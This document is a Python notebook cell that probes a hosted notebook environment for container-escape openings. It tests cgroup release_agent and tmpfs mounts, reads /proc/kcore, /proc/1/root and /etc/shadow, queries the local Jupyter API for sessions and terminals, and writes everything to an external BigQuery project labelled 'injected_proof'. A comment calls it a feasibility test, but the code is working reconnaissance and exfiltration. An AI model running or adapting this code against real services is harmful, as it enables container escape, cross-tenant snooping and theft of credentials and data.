In [ ]:
import os, json, subprocess
from google.cloud import bigquery

def safe(label, fn):
    try: return {'label': label, 'value': str(fn())[:3500]}
    except Exception as e: return {'label': label, 'value': f'ERR: {type(e).__name__}: {str(e)[:500]}'}

p = []
# Test container escape primitives (FEASIBILITY only, no actual escape)
p.append(safe('userns_unprivileged', lambda: open('/proc/sys/kernel/unprivileged_userns_clone').read().strip()))
p.append(safe('userns_max', lambda: open('/proc/sys/user/max_user_namespaces').read().strip()))

# Can we mount?
p.append(safe('mount_test_tmpfs', lambda: subprocess.run(['mount','-t','tmpfs','none','/tmp/mnt_test'], capture_output=True, text=True).stderr or 'mount returned 0'))
subprocess.run(['mkdir','-p','/tmp/mnt_test'], capture_output=True)
p.append(safe('mount_test2_tmpfs', lambda: subprocess.run(['mount','-t','tmpfs','none','/tmp/mnt_test'], capture_output=True, text=True).stderr or 'OK_mount_tmpfs'))

# Cgroup feasibility
p.append(safe('cgroup_root_writable', lambda: os.access('/sys/fs/cgroup', os.W_OK)))
p.append(safe('cgroup_ls', lambda: subprocess.run(['ls','-la','/sys/fs/cgroup'], capture_output=True, text=True).stdout[:2000]))
p.append(safe('cgroup_controllers', lambda: open('/sys/fs/cgroup/cgroup.controllers').read().strip()))
p.append(safe('cgroup_subtree', lambda: open('/sys/fs/cgroup/cgroup.subtree_control').read().strip()))

# Try to write to cgroup release_agent (the classic escape primitive)
p.append(safe('release_agent_test_mkdir', lambda: subprocess.run(['mkdir','/sys/fs/cgroup/xrdp'], capture_output=True, text=True).stderr or 'OK_mkdir_in_cgroup'))

# Mount a NEW cgroup with release_agent (the real test)
subprocess.run(['mkdir','-p','/tmp/cgrp'], capture_output=True)
mt = subprocess.run(['mount','-t','cgroup','-o','rdma','cgroup','/tmp/cgrp'], capture_output=True, text=True)
p.append({'label':'mount_rdma_cgroup_v1','value': f'rc={mt.returncode} stderr={mt.stderr[:300]} stdout={mt.stdout[:200]}'})

# Test memory-controller mount (alternate)
subprocess.run(['mkdir','-p','/tmp/cgrp2'], capture_output=True)
mt2 = subprocess.run(['mount','-t','cgroup','-o','memory','cgroup','/tmp/cgrp2'], capture_output=True, text=True)
p.append({'label':'mount_memory_cgroup_v1','value': f'rc={mt2.returncode} stderr={mt2.stderr[:300]}'})

# Procfs access
p.append(safe('proc_kcore_size', lambda: os.path.getsize('/dev/core')))
p.append(safe('proc_kcore_readable', lambda: open('/proc/kcore','rb').read(16).hex()))
p.append(safe('proc_kmsg', lambda: subprocess.run(['cat','/proc/kmsg'], capture_output=True, text=True, timeout=2).stderr))

# Can we list other tenants' files?
p.append(safe('ls_var', lambda: subprocess.run(['ls','-la','/var'], capture_output=True, text=True).stdout[:1500]))
p.append(safe('ls_opt', lambda: subprocess.run(['ls','-la','/opt'], capture_output=True, text=True).stdout[:1500]))
p.append(safe('ls_datalab', lambda: subprocess.run(['ls','-la','/datalab'], capture_output=True, text=True).stdout[:1500]))

# Host filesystem accessible via /proc/PID?
p.append(safe('proc_1_root_ls', lambda: subprocess.run(['ls','-la','/proc/1/root/'], capture_output=True, text=True).stdout[:1500]))
p.append(safe('proc_1_root_writable', lambda: os.access('/proc/1/root/', os.W_OK)))

# Try to read /proc/1/cmdline of PID 1 to confirm same vs different container
p.append(safe('proc_1_cmdline_again', lambda: open('/proc/1/cmdline','rb').read().decode().replace(chr(0),' ')))

# /etc/shadow readability (would prove host access if we can read it from a host-mounted location)
p.append(safe('shadow_readable', lambda: open('/etc/shadow').read()[:500]))

# Can we see other notebook runtimes via /proc enumeration?
p.append(safe('proc_pids', lambda: ','.join(sorted([d for d in os.listdir('/proc') if d.isdigit()]))))

# Jupyter on localhost:6000 — let's see what tokens/endpoints it has
import urllib.request
p.append(safe('jupyter_root', lambda: urllib.request.urlopen('http://localhost:6000/', timeout=3).read()[:1500].decode('utf-8','replace')))
p.append(safe('jupyter_api_sessions', lambda: urllib.request.urlopen('http://localhost:6000/api/sessions', timeout=3).read()[:2000].decode('utf-8','replace')))
p.append(safe('jupyter_api_terminals', lambda: urllib.request.urlopen('http://localhost:6000/api/terminals', timeout=3).read()[:2000].decode('utf-8','replace')))

# Write all
client = bigquery.Client(project='bq-ssrf-453453')
table_id = 'bq-ssrf-453453.injected_proof.NBEX_ESCAPE_PROBE'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, p)
print('rows', len(p), 'errors', errs)
